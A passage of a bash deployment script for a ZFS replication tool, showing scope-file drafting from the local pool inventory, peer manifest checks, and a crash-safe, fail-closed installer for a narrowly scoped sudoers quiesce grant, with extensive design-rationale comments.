# ENROLMENT-AGREED-2026-08-02 T3: the sha256 of the scope file --commit-scope
# most recently granted from, as a sidecar next to it -- not a second
# manifest (there is nothing here a parser could disagree about, just a
# hash), and not embedded in the scope file itself (which would change the
# file's own hash the moment it recorded one). The collector fetches this
# alongside the scope file and refuses to generate/activate a job config
# when the two disagree.
peer_scope_granted_hash_path() {
    echo "$PEER_STATE_DIR/$1.scope.sha256"
}

# REV-20260802-033 slice 4: names Proxmox's own installer-created system
# datasets, checked against a depth-1 dataset's LAST path component only --
# never a prefix/substring match, so a real workload named e.g. "rootfs" or
# "swap-backups" is never mistaken for the boot environment or swap zvol.
# Deliberately short and explicit rather than a clever heuristic: F2's
# example roots (rpool/data, rpool/olds, hdd/LXC) are ordinary names this
# census must NOT catch, and the failure mode of catching one is silent data
# loss from a backup relationship that never existed. Add a name here, and
# only here, if a future Proxmox default needs excluding by default -- the
# full inventory below still lists it either way, so nothing is ever hidden,
# only left inactive until an operator opts in by hand.
DRAFT_SCOPE_SYSTEM_NAMES="ROOT swap"

draft_scope_is_system() {   # <depth-1 dataset name>
    local base="${1##*/}" n
    for n in $DRAFT_SCOPE_SYSTEM_NAMES; do
        [ "$base" = "$n" ] && return 0
    done
    return 1
}

# ENROLMENT-AGREED-2026-08-02 T5: a rough census of snapshot NAME FAMILIES
# actually present on this host, printed as comments alongside the
# inventory. Purely informational -- nothing here drives any decision in
# this script, so the prefix derived below only needs to be useful to a
# human reading the file, not exact. Strips a trailing date (this project's
# own automated_* convention) or a run of 6+ digits (epoch-stamped names
# like Proxmox's __replicate_..._<epoch>__) and treats what is left as the
# family; a name with neither (vzdump, __migration__) is its own family
# verbatim.
draft_scope_snapshot_census() {   # <pool>...
    local pool name prefix fam n
    local -A counts=()
    for pool in "$@"; do
        while IFS= read -r name; do
            [ -n "$name" ] || continue
            prefix=$(printf '%s' "$name" | sed -E 's/[0-9]{4}-[0-9]{2}-[0-9]{2}.*$//; s/[0-9]{6,}.*$//')
            [ -n "$prefix" ] || prefix="$name"
            counts["$prefix"]=$(( ${counts["$prefix"]:-0} + 1 ))
        done < <(zfs list -H -o name -t snapshot -r -- "$pool" 2>/dev/null | sed 's/^[^@]*@//')
    done
    if [ "${#counts[@]}" -eq 0 ]; then
        echo "# (no snapshots found)"
        return 0
    fi
    for fam in "${!counts[@]}"; do
        printf '%s\t%s\n' "$fam" "${counts[$fam]}"
    done | sort | while IFS=$'\t' read -r fam n; do
        printf '# %-40s %s snapshot(s)\n' "$fam" "$n"
    done
}

# do_draft_scope_check -- everything --draft-scope validates before it is
# willing to write anything: manifest exists, describes a delegated PULL peer
# (same shape as do_commit_scope_check -- a scope file only ever applies
# there), and the target file does not already exist. The last one is not a
# technicality: overwriting a file an operator may already be mid-edit on
# would be exactly the kind of silent clobber this project refuses elsewhere.
DRAFT_SCOPE_SFILE=""; DRAFT_SCOPE_ACCOUNT=""
do_draft_scope_check() {
    local label="$1" mpath sfile
    [ -n "$label" ] || die "internal: do_draft_scope_check needs a label"
    mpath=$(peer_manifest_path "$label")
    [ -r "$mpath" ] || die "no pairing manifest for '$label' at $mpath -- run --join first"
    # shellcheck disable=SC1090
    . "$mpath"
    [ "${PEER_JOIN_AS:-}" != root ] \
        || die "'$label' joined with --as=root -- root already has full authority on this host, there is nothing to scope"
    [ "${PEER_JOIN_ROLE:-}" = pull ] \
        || die "'$label' is role=${PEER_JOIN_ROLE:-?} -- a scope file only applies to the PULL side (this host as the data source)"
    [ -n "${PEER_JOIN_ACCOUNT:-}" ] || die "internal: manifest for '$label' has no account recorded"
    sfile=$(peer_scope_path "$label")
    if [ -e "$sfile" ]; then
        die "$sfile already exists -- refusing to overwrite it (an operator may be mid-edit). Edit it directly, or remove it by hand first if you really want a fresh draft."
    fi
    DRAFT_SCOPE_SFILE="$sfile"
    DRAFT_SCOPE_ACCOUNT="$PEER_JOIN_ACCOUNT"
    return 0
}

# do_draft_scope -- F1/F2's "discovery happens on the source" requirement.
# Inventories every real pool on THIS host and writes an editable
# lib-scope.sh file: an ACTIVE section (one [dataset:] per non-system dataset
# one level below each pool, include_parent=no/include_children=yes -- F2
# owner decision #6/#7) plus the complete inventory as comments, so an
# operator can select one explicit leaf instead of an entire branch (F2
# acceptance criterion). Never executes anything from the result -- this
# writes lib-scope.sh's own grammar, the same file --commit-scope later reads
# as pure data.
do_draft_scope() {
    local label="$1"
    do_draft_scope_check "$label"
    local sfile="$DRAFT_SCOPE_SFILE" account="$DRAFT_SCOPE_ACCOUNT"

    local -a pools=()
    while IFS= read -r p; do [ -n "$p" ] && pools+=("$p"); done \
        < <(zpool list -H -o name 2>/dev/null | sort)
    [ "${#pools[@]}" -gt 0 ] || die "no ZFS pools found on this host -- nothing to draft"

    # The consent document must default to the REQUEST, not to the estate.
    # Found live 2026-08-17 (lab3): the collector asked for exactly one
    # dataset (--datasets=hdd/lab3/src), yet the draft's ACTIVE section
    # proposed every top-level branch on this host -- production VM disks
    # included. An operator who signs that draft as-is grants far more than
    # was ever requested, and the whole point of the source-side commit is
    # that what gets signed is what was meant. The join manifest already
    # records what the collector asked for (PEER_JOIN_DATASETS), so when it
    # names datasets, the ACTIVE section is exactly those -- still editable,
    # still committed by the operator, with the full inventory kept below as
    # the menu for widening BY HAND. A pre-join --draft-scope has no manifest
    # and keeps the branch-inventory default, which is the correct "nobody
    # asked for anything specific yet" answer.
    #
    # LAB6 pass 7 F-1 (2026-08-22): that used to be said of mode-based (sync)
    # joins too, and for a bare `add-client --mode=sync` it is still true. It
    # was NOT true for the one-command form: `--source=HOST:DATASET --mode=sync`
    # names a dataset and the enrolment dropped it, so the source drafted from
    # an empty request -- measured live, an enrolment naming hdd/lab6chain
    # produced an ACTIVE section covering hdd/vm-disks (5.39T of production VM
    # disks, the OpenVPN gateway among them) and rpool/data, with "run
    # --commit-scope" printed as the next step. PEER_JOIN_REQUESTED now carries
    # what was named. It narrows the DRAFT and nothing else: the dataset list
    # for a mode-based relationship is still whatever this host COMMITS, the
    # inventory is still printed below for widening by hand, and a package
    # without the field (older collector, or a genuinely unnamed request) draws
    # the whole-estate draft exactly as before.
    local -a active=()
    local pool ds
    local mpath_draft PEER_JOIN_DATASETS="" PEER_JOIN_REQUESTED=""
    mpath_draft=$(peer_manifest_path "$label")
    if [ -r "$mpath_draft" ]; then
        # shellcheck disable=SC1090
        . "$mpath_draft"
    fi
    # The two are alternatives by construction (validate_peer_conf refuses a
    # package carrying both), so this is a choice between them, not a merge.
    local named="$PEER_JOIN_DATASETS" named_kind="PEER_JOIN_DATASETS"
    if [ -z "$named" ] && [ -n "$PEER_JOIN_REQUESTED" ]; then
        named="$PEER_JOIN_REQUESTED"; named_kind="PEER_JOIN_REQUESTED"
    fi
    local from_request=0
    if [ -n "$named" ]; then
        # LAB6-F1 (2026-08-21): NAMED IS WANTED. When the active stanzas come
        # from an explicit request, the operator typed each of these names, and
        # the container heuristic below ("a dataset with children is a branch,
        # send only what is under it") silently excluded the parent -- so a
        # request for hdd/lab6/tree drafted a scope whose own text said the
        # data ON tree stays behind. The heuristic remains right for the
        # whole-estate draft, where nobody named anything and containers
        # abound; for a request it overrode the one thing that was actually
        # said.
        from_request=1
        for ds in $named; do
            zfs list -H -o name -- "$ds" >/dev/null 2>&1 \
                || die "the collector requested '$ds' ($named_kind in $mpath_draft), but no such dataset exists on this host -- refusing to draft a scope around a request that cannot be satisfied"
            active+=("$ds")
        done
    else
        for pool in "${pools[@]}"; do
            while IFS= read -r ds; do
                [ -n "$ds" ] || continue
                [ "$ds" = "$pool" ] && continue
                draft_scope_is_system "$ds" && continue
                active+=("$ds")
            done < <(zfs list -H -o name -r -d 1 -- "$pool" 2>/dev/null | sort)
        done
    fi
    [ "${#active[@]}" -gt 0 ] \
        || die "every dataset found is a pool root or a known system dataset (${DRAFT_SCOPE_SYSTEM_NAMES}) -- nothing to activate by default. Edit $sfile's inventory section by hand once it exists, or check this host's pool layout."

    local tmp; tmp=$(mktemp) || die "mktemp failed"
    {
        printf '# Scope file for peer '"'"'%s'"'"' -- generated by deploy.sh --draft-scope.\n' "$label"
        printf '# Account: %s\n' "$account"
        printf '# Generated: %s\n' "$(date '+%Y-%m-%d %H:%M:%S %Z')"
        echo "#"
        echo "# Edit the ACTIVE section below (add/remove/replace [dataset:] stanzas --"
        echo "# copy an entry from the inventory further down for one explicit leaf"
        echo "# instead of a whole branch), then run:"
        printf '#   deploy.sh --commit-scope=%s\n' "$label"
        echo "#"
        echo "# Grammar (lib-scope.sh):"
        echo "#   [dataset:<pool/path>]"
        echo "#       include_parent   = yes | no"
        echo "#       include_children = yes | no"
        echo "#       exclude          = <pool/path>   (repeatable)"
        echo "#       exclude_tree     = <pool/path>   (repeatable)"
        echo "#"
        echo "# This file is transferred and read as DATA -- never executed. Malformed"
        echo "# or ambiguous input fails --commit-scope closed; nothing here runs a shell."
        echo
        # `include_parent = no` describes a BRANCH: back up what is under this
        # path, not the path itself. That is the right default for a container
        # like hdd/vm-disks, and it selects NOTHING for a dataset that has no
        # children -- the draft then commits to an empty grant and the operator
        # meets "selects nothing that exists on this host". Correct (it fails
        # closed) and useless as a starting point, because the obvious reading of
        # a stanza naming a leaf is "back up this".
        #
        # Measured live on pve2, 2026-08-14: a freshly created leaf dataset
        # drafted this way, and the guided join refused until the line was
        # changed by hand -- on the very path issue #9 says needs no hand editing.
        #
        # So the draft states the intent that matches the shape: a dataset with
        # children keeps the branch default, a leaf includes itself. Both remain
        # editable, and neither is inferred at commit time -- the file still says
        # exactly what will be granted.
        for ds in "${active[@]}"; do
            printf '[dataset:%s]\n' "$ds"
            # A REQUESTED dataset always includes itself: the operator named it,
            # and naming is wanting (LAB6-F1). The branch heuristic applies only
            # to the estate draft, where the stanzas are proposals, not asks.
            if [ "$from_request" -eq 0 ] \
               && zfs list -H -o name -r -- "$ds" 2>/dev/null | grep -qv "^${ds}$"; then
                echo "include_parent = no"
            else
                echo "include_parent = yes"
            fi
            echo "include_children = yes"
            echo
        done
        echo "# =========================================================="
        echo "# Full inventory -- informational. Copy/uncomment/edit a line above as a"
        echo "# [dataset:] stanza to select one explicit leaf, a single VM disk, or"
        echo "# another branch instead of the defaults above."
        echo "# Source: zfs list -H -o name,type,used,refer,mountpoint -r"
        echo "# =========================================================="
        for pool in "${pools[@]}"; do
            zfs list -H -o name,type,used,refer,mountpoint -r -- "$pool" 2>/dev/null \
                | sort | while IFS= read -r line; do printf '# %s\n' "$line"; done
        done
        echo "# =========================================================="
        echo "# Snapshot families seen on this host -- informational"
        echo "# (ENROLMENT-AGREED-2026-08-02 T5). A collector generating a job"
        echo "# from this scope protects its OWN reserved prefixes"
        echo "# (__replicate_, __migration__, vzdump) on its copies regardless of"
        echo "# this list; it exists so an operator editing this file can see"
        echo "# what is actually here, not guess."
        echo "# =========================================================="
        draft_scope_snapshot_census "${pools[@]}"
    } > "$tmp"

    # World-readable (matches this project's existing convention for
    # /etc/zfs-snapshot-all/'s other config files -- see
    # assert_config_readable_by_target's own comment on the parent
    # directory). Set on $tmp, before the rename, so $sfile never exists at
    # its final path with mktemp's default 600: the collector's delegated
    # account needs to read this file over ssh later (slice 6's fetch step)
    # and does not run as root or as whoever ran --draft-scope.
    chmod 0644 "$tmp" 2>/dev/null
    if ! mv -f "$tmp" "$sfile"; then
        rm -f "$tmp"
        die "could not write $sfile"
    fi
    log "drafted $sfile: ${#active[@]} active dataset(s) from ${#pools[@]} pool(s)"
    log "scope draft is ready for review"
}

# do_join_check -- everything --join does to a package before it is willing to
# believe it, and then nothing. Prints the normalised values so a legitimate
# package can be inspected, and exits non-zero on the first thing it does not
# like. Useful on its own (look before you run it as root on a box that trusts
# nobody), and it is what makes the trust boundary testable without root.
do_join_check() {
    [ -n "$JOIN_PACKAGE" ] || die "--join-check needs a package path"
    prepare_package "$JOIN_PACKAGE"
    echo "package OK: $JOIN_PACKAGE"
    printf '  %-26s %s
' "sha256" "${PKG_SHA256:-?}"
    local k
    for k in PEER_CONF_ROLE PEER_CONF_AS PEER_CONF_MODE PEER_CONF_ACCOUNT PEER_CONF_TARGET              PEER_CONF_DATASETS PEER_CONF_PORT PEER_CONF_INITIATOR_LABEL PEER_CONF_REMOTE_JOIN; do
        printf '  %-26s %s
' "$k" "${PC[$k]:-}"
    done
    printf '  %-26s %s
' "pubkey" "$(pubkey_fingerprint "$JOIN_WORKDIR/pubkey.pub")"
    return 0
}

# do_commit_scope_check -- everything --commit-scope validates before it is
# willing to touch ZFS, and then nothing: manifest exists, describes a
# delegated PULL peer (the only shape a scope file applies to -- see
# lib-scope.sh's header), and the scope file itself parses. No root, no `zfs`
# command run here, same shape and same reason as do_join_check: this is what
# makes the file-format half of --commit-scope testable without root or a
# real pool. The dataset-walk-and-grant half genuinely needs both and is not
# reachable from here -- see do_commit_scope.
#
# Leaves SCOPE_ROOTS/etc (from lib-scope.sh's scope_read) and three globals
# populated for do_commit_scope to continue from, so the manifest is read
# exactly once.
COMMIT_SCOPE_MPATH=""; COMMIT_SCOPE_SFILE=""; COMMIT_SCOPE_ACCOUNT=""
do_commit_scope_check() {
    local label="$1" mpath sfile
    [ -n "$label" ] || die "internal: do_commit_scope_check needs a label"
    mpath=$(peer_manifest_path "$label")
    [ -r "$mpath" ] || die "no pairing manifest for '$label' at $mpath -- run --join first"
    # shellcheck disable=SC1090
    . "$mpath"
    [ "${PEER_JOIN_AS:-}" != root ] \
        || die "'$label' joined with --as=root -- root already has full authority on this host, there is nothing to grant"
    [ "${PEER_JOIN_ROLE:-}" = pull ] \
        || die "'$label' is role=${PEER_JOIN_ROLE:-?} -- a scope commit only grants the PULL side (this host as the data source); a push peer's account is granted receive access directly at --join time, on the target root named in its own manifest"
    [ -n "${PEER_JOIN_ACCOUNT:-}" ] || die "internal: manifest for '$label' has no account recorded"
    sfile=$(peer_scope_path "$label")
    [ -r "$sfile" ] \
        || die "no scope file for '$label' at $sfile -- create it by hand first (see lib-scope.sh's header for the grammar), then re-run --commit-scope"
    scope_read "$sfile" || die "scope file $sfile: $SCOPE_ERR"
    COMMIT_SCOPE_MPATH="$mpath"
    COMMIT_SCOPE_SFILE="$sfile"
    COMMIT_SCOPE_ACCOUNT="$PEER_JOIN_ACCOUNT"
    return 0
}

# --join-check validates a package and exits. It changes nothing, reads nothing
# outside the package, and therefore has no reason to demand root -- which also
# makes the trust boundary testable on any machine, instead of only on a host
# where a mistake in the test would create a real account. It runs BEFORE the
# root check for exactly that reason.
# Grants a delegated PULL account the ability to quiesce guests on this host,
# and nothing else -- see zfs-quiesce-helper.sh for why `sudo qm` is not an
# acceptable substitute. Three pieces, all root-owned:
#
#   /usr/local/sbin/zfs-quiesce-helper   the only command the account may run
#   /etc/zfs-quiesce-allow/<account>     the datasets whose guests it may touch
#   /etc/sudoers.d/zfs-quiesce-<account> the rule, NOPASSWD, no SETENV
#
# The whitelist is written from the SAME dataset list the zfs allow grants above
# are derived from, so the two cannot drift: an account may quiesce exactly the
# guests whose disks it is already allowed to replicate.
#
# NO SETENV, deliberately. The helper lets $ZFS_QUIESCE_ALLOW_DIR override where
# it reads the whitelist so the test suite can run without root; sudo's default
# env_reset is what stops a delegated account using that to point the whitelist
# at a file it controls. Adding SETENV here would hand over exactly that.
# Does any account still hold a whitelist here? Staged and preserved files
# (.zqg-new / .zqg-bak) are not accounts, and counting them would make a run that
# died mid-commit look like a peer whose grant must not be disturbed -- which is
# exactly the wrong conclusion to reach while cleaning up after that run.
# A dotfile cannot be an account either: pc_is_account requires [a-z_] first.
quiesce_allow_dir_empty() {
    local dir="$1" f
    [ -d "$dir" ] || return 0
    for f in "$dir"/*; do
        [ -e "$f" ] || continue
        case "$f" in *.zqg-new|*.zqg-bak) continue ;; esac
        return 1
    done
    return 0
}

install_quiesce_grant() {
    local account="$1" datasets="$2"
    local src="$REPO_DIR/zfs-quiesce-helper.sh"
    local dest="/usr/local/sbin/zfs-quiesce-helper"
    local allow_dir="/etc/zfs-quiesce-allow"
    local allow="$allow_dir/$account"
    local rule="/etc/sudoers.d/zfs-quiesce-$account"

    # TRANSACTIONAL (REV-20260731-008 F2). The old order installed the helper
    # and the whitelist first and only then discovered that sudo was missing or
    # the rule would not validate -- leaving a half-built privileged feature
    # behind on every failure. Half-built is not dangerous here (without the
    # sudoers rule nothing is granted) but it is ambiguous, and ambiguity around
    # privilege is what makes the next person guess.
    #
    # So: dependencies first, then everything staged in temporary files, then
    # one short commit phase, and on ANY failure the host goes back to the state
    # it was in before the run.
    #
    # "Before the run" is the part REV-20260731-009 §2 caught. The first version
    # tracked only CREATION -- it removed destinations that had not existed --
    # which is the whole story on a clean host and half of it on re-enrolment.
    # Rerunning `--join --allow-quiesce` with a changed dataset list or a newer
    # helper OVERWRITES all three destinations, and a failure partway through
    # left a mix of old and new that nothing rolled back. So every destination
    # that already exists is copied aside before the commit phase, and the
    # rollback either puts that copy back or removes what this run created -- and
    # says which of the two it did.
    #
    # `did_*` is set BEFORE each commit, not after: what decides whether a
    # destination needs restoring is "attempted", not "succeeded".
    #
    # CRASH SAFETY (owner request, 2026-07-31; the design REV-20260731-009 §3
    # named as the cleaner alternative). Everything above runs on the failure
    # paths of this function, so it covers a step that FAILS and not a process
    # that DIES -- `kill -9`, OOM, or the power going out ran no rollback at all
    # and left whatever the half-finished `install` had written.
    #
    # Two properties fix that, and neither needs a recovery replay:
    #
    #   1. No destination is ever written in place. Each new file is staged in
    #      ITS OWN destination directory as `<dest>.zqg-new` and then renamed
    #      over the destination. rename(2) is atomic, so every possible instant
    #      of a crash finds a destination holding EITHER the whole old file or
    #      the whole new one -- never a truncated privileged binary or half a
    #      sudoers rule. Staging beside the destination rather than in /tmp is
    #      what makes it a rename instead of a cross-filesystem copy.
    #
    #   2. The commit order makes every intermediate state fail CLOSED. The
    #      active sudoers rule is TURNED OFF first, then the whitelist and the
    #      helper are switched, and the new rule is installed last.
    #
    #      An earlier version of this committed whitelist, helper, rule and
    #      argued the whitelist could go first because it is a "restriction".
    #      That was wrong, and REV-20260731-012 caught it. It is only true on a
    #      FIRST install, where no rule exists yet and nothing is granted until
    #      the last step. On an UPDATE the final rule is already there and stays
    #      active through every rename, so the instant a wider whitelist lands --
    #      a re-enrol that adds a dataset -- the old rule and old helper read it
    #      and the account can freeze the new guests. A crash there leaves
    #      privilege PERMANENTLY widened by a transaction that never finished.
    #      "The narrower of the two lists stays in force" was simply false: what
    #      is in force after that rename is the new list, whatever its width.
    #
    #      Disabling the rule first costs a short window in which the account
    #      cannot quiesce at all. That is the right trade: a job that fails
    #      during an update is visible and retried, a silently widened grant is
    #      neither.
    #
    #      Turning it off is itself a rename -- onto the `.zqg-bak` name, which
    #      sudoers.d ignores -- so the disable is atomic and IS the preservation
    #      step for the rule. That is also why the rule is the one destination
    #      that does not get a hard-linked backup: a rename onto its own hard
    #      link is a no-op by POSIX, so the rule would have stayed live.
    #
    # `.zqg-new` and `.zqg-bak` both contain a dot, which matters more than it
    # looks: sudoers.d IGNORES any file whose name contains a '.' or ends in
    # '~'. That is what makes it safe to stage a sudoers rule inside
    # /etc/sudoers.d itself -- sudo will not read it until it has been renamed
    # onto its dotless final name. `pc_is_account` rejects every character
    # outside [a-z0-9_-], so an account name can never smuggle a dot into the
    # final name and make the real rule invisible the same way.
    local pre_helper=0 pre_allow=0 pre_rule=0 created_dir=0
    local did_helper=0 did_allow=0 did_rule=0
    local installed_sudo=0
    local tmp_allow="" tmp_rule="" visudo_bin=""

    # The rollback copy is a HARD LINK, not a copy: it is the original inode, so
    # it carries the content, owner, mode and every xattr by identity instead of
    # by a copy that could quietly lose one. The rename that replaces the
    # destination only swings the directory entry, so the link keeps pointing at
    # the original bytes. `cp -p` is the fallback for filesystems that refuse it.
    _grant_preserve() {   # <destination>; 1 = it did not exist, 2 = give up
        [ -e "$1" ] || return 1
        rm -f "$1.zqg-bak" 2>/dev/null
        ln "$1" "$1.zqg-bak" 2>/dev/null && return 0
        cp -p "$1" "$1.zqg-bak" 2>/dev/null && return 0
        return 2
    }
    # Restoring is one rename, so the rollback is atomic per file too -- a
    # rollback that is itself interrupted cannot leave a truncated file behind.
    _grant_restore() {   # <destination>
        [ -e "$1.zqg-bak" ] || return 1
        mv -f "$1.zqg-bak" "$1" 2>/dev/null
    }
    # Staged and preserved files are the fingerprint of an interrupted run. They
    # are swept rather than replayed: this function rewrites all three
    # destinations anyway, so "run it again" IS the recovery, and replaying a
    # half-finished intent would be guessing at which half was wanted.
    _grant_sweep() {   # <"quiet"|"report">
        local f found="" parked=""
        for f in "$dest" "$allow" "$rule"; do
            [ -e "$f.zqg-new" ] && { rm -f "$f.zqg-new" && found="$found $f.zqg-new"; }
            if [ -e "$f.zqg-bak" ]; then
                if [ -e "$f" ]; then
                    # The destination is whole, so the backup is spare.
                    rm -f "$f.zqg-bak" && found="$found $f.zqg-bak"
                else
                    # Destination gone, backup present: a run died between
                    # suspending the old file and installing the new one.
                    #
                    # It is LEFT PARKED (REV-20260731-013). An earlier version
                    # renamed it straight back, reasoning that it was the only
                    # copy left and deleting it would lose the grant. Restoring
                    # it is worse: by the time the rule is parked, this run's
                    # predecessor has already committed the new -- possibly
                    # WIDER -- whitelist and helper, so re-arming the old rule
                    # activates it against them. That is the same privilege
                    # widening REV-012 closed, moved out of the commit path and
                    # into recovery, and it would persist if this run then
                    # failed during staging.
                    #
                    # Nothing is lost by parking: the file is still there, under
                    # a name sudoers.d ignores, and the commit below installs a
                    # coherent rule as its LAST step. Interrupted therefore means
                    # disabled, and it stays disabled until a run completes.
                    parked="$parked $f.zqg-bak"
                fi
            fi
        done
        if [ "$1" = report ]; then
            [ -n "$found" ] && warn "a previous grant run for $account was interrupted before it finished -- stale staging removed:$found"
            [ -n "$parked" ] && warn "a previous grant run for $account was interrupted mid-update: the grant is currently DISABLED and its previous content is parked at$parked. It stays disabled until a run completes -- re-arming it now would activate the old rule against the new whitelist. If this run fails, the account keeps no access at all."
        fi
        return 0
    }
    _grant_rollback() {
        local restored="" removed="" lost=""
        # Reverse commit order. The rule goes first because it is the only one
        # of the three that grants anything: until it is gone, or back to its
        # previous content, the account can still reach the helper.
        if [ "$did_rule" -eq 1 ]; then
            if [ "$pre_rule" -eq 1 ]; then
                _grant_restore "$rule" && restored="$restored $rule" || lost="$lost $rule"
            else
                rm -f "$rule" && removed="$removed $rule"
            fi
        fi
        if [ "$did_allow" -eq 1 ]; then
            if [ "$pre_allow" -eq 1 ]; then
                _grant_restore "$allow" && restored="$restored $allow" || lost="$lost $allow"
            else
                rm -f "$allow" && removed="$removed $allow"
            fi
        fi
        [ "$created_dir" -eq 1 ] && rmdir "$allow_dir" 2>/dev/null
        # The helper is judged LAST although it was committed second: whether a
        # helper this run installed may be removed depends on whether any account
        # still holds a whitelist, and this run's own whitelist has to be gone
        # before that question can be answered honestly.
        if [ "$did_helper" -eq 1 ]; then
            if [ "$pre_helper" -eq 1 ]; then
                # Shared by every peer on this host, so the previous copy has to
                # come back even though this run's failure was about a single
                # account: the other relationships never asked for an upgrade.
                _grant_restore "$dest" && restored="$restored $dest" || lost="$lost $dest"
            elif quiesce_allow_dir_empty "$allow_dir"; then
                # Put there by THIS run, and nobody ended up with a grant --
                # otherwise removing it would break relationships this run never
                # touched.
                rm -f "$dest" && removed="$removed $dest"
            else
                warn "$dest was installed by this run and is being left in place: another account still holds a grant. It is inert without a whitelist and a sudoers rule."
            fi
        fi

        [ -n "$restored" ] && warn "rolled back to the previous grant, restored:$restored"
        [ -n "$removed" ]  && warn "rolled back, removed what this run created:$removed"
        [ -n "$lost" ]     && warn "COULD NOT RESTORE:$lost -- this host is left holding content from a FAILED run. Put it right by hand before anything relies on the grant."
        # A rule file that does not parse breaks sudo for every user on the host,
        # root included, so the state the rollback left behind is checked rather
        # than assumed.
        if [ "$did_rule" -eq 1 ] && [ -n "$visudo_bin" ]; then
            "$visudo_bin" -c >/dev/null 2>&1 \
                || warn "/etc/sudoers no longer parses cleanly after the rollback -- inspect it NOW with '$visudo_bin -c'"
        fi
        # REV-20260731-009 §5: a package install is a host-level side effect that
        # is deliberately NOT undone, because removing a package automatically is
        # riskier than leaving a standard dependency behind. Leaving it unsaid is
        # what makes the outcome confusing.
        [ "$installed_sudo" -eq 1 ] && warn "the grant was not created. The 'sudo' package was installed by this run and has been left in place."

        [ -n "$tmp_allow" ] && rm -f "$tmp_allow"
        [ -n "$tmp_rule" ]  && rm -f "$tmp_rule"
        _grant_sweep quiet
        return 0
    }

    if [ ! -r "$src" ]; then
        warn "--allow-quiesce given but $src is missing (older checkout?) -- remote quiesce will refuse for $account"
        return 1
    fi

    # ---- 1. dependencies, before anything is created ----
    #
    # sudo is NOT a given on a bare Proxmox host. Found live on pve1 and pve0
    # (2026-07-31): neither `sudo` nor `visudo` existed, so `visudo -cf` returned
    # 127 and the old code read "command not found" as "the rule is invalid" --
    # a correct refusal reached for entirely the wrong reason, with a message
    # that would have sent someone hunting a syntax error that was not there.
    # The helper is reached THROUGH sudo, so this is a hard dependency.
    _find_visudo() {
        local c
        for c in visudo /usr/sbin/visudo /sbin/visudo; do
            if command -v "$c" >/dev/null 2>&1; then visudo_bin="$c"; return 0; fi
        done
        return 1
    }
    if ! _find_visudo; then
        log "sudo is not installed on this host, and --allow-quiesce cannot work without it -- installing it now"
        if ! apt_install_with_fallback sudo; then
            warn "could not install the 'sudo' package -- no quiesce grant was created for $account"
            return 1
        fi
        installed_sudo=1
        _find_visudo || {
            _grant_rollback
            warn "still no visudo after installing sudo -- no quiesce grant was created for $account"
            return 1
        }
    fi
    if ! command -v sudo >/dev/null 2>&1; then
        _grant_rollback
        warn "visudo is present but the sudo binary is not -- the helper would be unreachable, no grant created for $account"
        return 1
    fi

    # ---- 2. stage everything, validate, install nothing yet ----
    tmp_allow=$(mktemp) || { warn "mktemp failed staging the whitelist for $account"; return 1; }

    # MERGE mode reads what is already granted and keeps it. FAIL CLOSED if it
    # cannot: absence from the caller's list is not evidence of obsolescence,
    # and neither is an unreadable file (REV-20260802-028).
    local merged; merged=$(mktemp) || { warn "mktemp failed merging the whitelist for $account"; return 1; }
    if [ "${QUIESCE_MERGE:-0}" -eq 1 ] && [ -e "$allow" ]; then
        if [ ! -r "$allow" ]; then
            rm -f "$merged"
            warn "the existing whitelist $allow cannot be read, so a merge cannot preserve it -- refusing to touch the grant for $account"
            return 1
        fi
        grep -vE '^[[:space:]]*(#|$)' "$allow" >> "$merged" 2>/dev/null || :
    fi
    local ds
    for ds in $datasets; do echo "$ds" >> "$merged"; done

    {
        # Names the FLAG, not a mode: two paths write this file now (--join for
        # a peer, a plain run for this host's own account) and a header that
        # names the wrong one sends the reader to the wrong command.
        echo "# managed by deploy.sh --allow-quiesce, do not edit by hand"
        echo "# guests whose disks live under these datasets may be frozen by '$account'"
        sort -u "$merged"
    } > "$tmp_allow" || { rm -f "$merged"; _grant_rollback; warn "could not stage the whitelist for $account"; return 1; }
    rm -f "$merged"

    tmp_rule=$(mktemp) || { _grant_rollback; warn "mktemp failed staging the sudoers rule"; return 1; }
    printf '%s ALL=(root) NOPASSWD: %s
' "$account" "$dest" > "$tmp_rule"
    # Validated BEFORE it goes near /etc/sudoers.d: a syntactically broken file
    # there breaks sudo for EVERY user on the host, root included.
    if ! "$visudo_bin" -cf "$tmp_rule" >/dev/null 2>&1; then
        _grant_rollback
        warn "the generated sudoers rule for $account did not pass '$visudo_bin -c' -- nothing was installed"
        return 1
    fi

    # ---- 3. the whitelist directory, then stage and preserve ----
    #
    # The directory has to exist before anything can be staged inside it. It is
    # not part of the atomic commit and does not need to be: an empty directory
    # grants nothing.
    if [ ! -d "$allow_dir" ]; then
        created_dir=1
        # created_dir is deliberately NOT reset to 0 on failure (REV-20260731-011).
        # `install -d` creates the directory and THEN applies owner and mode, so it
        # can fail having already made it -- resetting the flag would leave that
        # empty directory behind as the one residue of a run that reported
        # creating nothing. Letting the rollback try is free: `rmdir` refuses a
        # non-empty directory, and this branch only runs when the directory did
        # not exist, so there is nothing of anyone else's in it to lose.
        install -o root -g root -m 0755 -d "$allow_dir" || {
            _grant_rollback
            warn "could not create $allow_dir -- no quiesce grant was created for $account"; return 1
        }
    fi

    # Anything left by a run that died mid-commit goes now, before this one
    # stages over the same names.
    _grant_sweep report

    # Staged with their FINAL owner and mode, so the commit is a rename and
    # nothing else -- no chown or chmod can fail after the first destination has
    # already changed.
    _grant_stage() {   # <source> <mode> <destination>
        install -o root -g root -m "$2" "$1" "$3.zqg-new" && return 0
        _grant_rollback
        warn "could not stage $3.zqg-new -- nothing was replaced, the grant for $account is unchanged"
        return 1
    }
    _grant_stage "$src"       0755 "$dest"  || return 1
    _grant_stage "$tmp_allow" 0644 "$allow" || return 1
    _grant_stage "$tmp_rule"  0440 "$rule"  || return 1

    # The rule is deliberately absent from this loop: its preservation is the
    # disabling rename in the commit phase below, and a hard link here would make
    # that rename a POSIX no-op and leave the grant live.
    local d
    for d in "$dest" "$allow"; do
        _grant_preserve "$d"
        case $? in
            0) case "$d" in "$dest") pre_helper=1 ;; "$allow") pre_allow=1 ;; esac ;;
            2) _grant_rollback
               warn "could not take a rollback copy of $d -- nothing was replaced, the grant for $account is unchanged"
               return 1 ;;
        esac
    done
    [ -e "$rule" ] && pre_rule=1

    # ---- 4. commit ----
    #
    # Renames and nothing else. Every failure that can be caused by disk space,
    # permissions, a bad source or an invalid rule has already happened above,
    # which is what shrinks the window a crash can land in to the gaps between
    # these lines -- and every one of those gaps is a state with LESS privilege
    # than the run started with, by the ordering argued at the top.
    #
    # An update replaces all three destinations unconditionally rather than
    # comparing content first: the helper has to be able to move forward with the
    # repository, and a whitelist rewritten from the same dataset list it always
    # was is a no-op in content even when the bytes are rewritten. What is bounded
